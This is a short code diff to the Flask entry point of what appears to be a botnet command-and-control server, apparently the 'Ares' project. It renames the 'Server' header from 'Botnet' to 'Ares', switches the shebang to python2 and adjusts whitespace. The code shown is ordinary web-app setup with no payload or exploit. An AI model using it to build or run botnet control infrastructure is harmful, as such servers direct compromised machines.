@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 
 import random
 import string
@@ -19,6 +19,7 @@ from webui import webui
 from api import api
 from config import config
 
+
 app = Flask(__name__)
 app.config.from_object(config['dev'])
 app.register_blueprint(webui)
@@ -26,10 +27,12 @@ app.register_blueprint(api, url_prefix="/api")
 db.init_app(app)
 manager = Manager(app)
 
+
 @app.after_request
 def headers(response):
-    response.headers["Server"] = "Botnet"
+    response.headers["Server"] = "Ares"
     return response
+
 
 @manager.command
 def initdb():
@@ -37,5 +40,6 @@ def initdb():
     db.create_all()
     db.session.commit()
 
+    
 if __name__ == '__main__':
     manager.run()
